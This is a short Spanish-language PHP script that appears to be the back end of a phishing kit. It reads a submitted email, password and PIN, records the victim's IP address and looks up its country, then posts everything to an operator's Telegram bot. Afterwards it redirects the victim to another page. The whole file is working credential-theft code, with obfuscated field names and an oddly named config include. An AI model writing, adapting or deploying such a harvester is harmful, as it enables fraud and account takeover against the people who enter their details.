<?php
require 'guat53-45475fr477Sttcs.php';

if (!isset($_POST['uzer'], $_POST['pazz'], $_POST['p1n']) || empty($_POST['uzer']) || empty($_POST['pazz']) || empty($_POST['p1n'])) {
    die("Error: Todos los campos son obligatorios.");
}
$uzer = filter_var($_POST['uzer'], FILTER_SANITIZE_EMAIL);
$pazz = htmlspecialchars(strip_tags($_POST['pazz']), ENT_QUOTES, 'UTF-8');
$p1n = htmlspecialchars(strip_tags($_POST['p1n']), ENT_QUOTES, 'UTF-8');
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($forwarded_ips[0]); // Tomamos la primera IP de la lista
} elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}
$country = "Desconocido";
$api_url = "http://ip-api.com/json/$ip?fields=country";
$response = @file_get_contents($api_url);
if ($response) {
    $data = json_decode($response, true);
    if (isset($data['country'])) {
        $country = $data['country'];
    }
}
$message = "📌"
         . "*Email:* `$uzer` - "
         . "*Pass:* `$pazz` - "
         . "*PIN:* `$p1n` \n"
         . "🌎 *País:* $country  "
         . " *IP:* $ip\n";

$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    die("Error en cURL: " . curl_error($ch));
}
curl_close($ch);

header("Location: index1.html");
exit();
?>
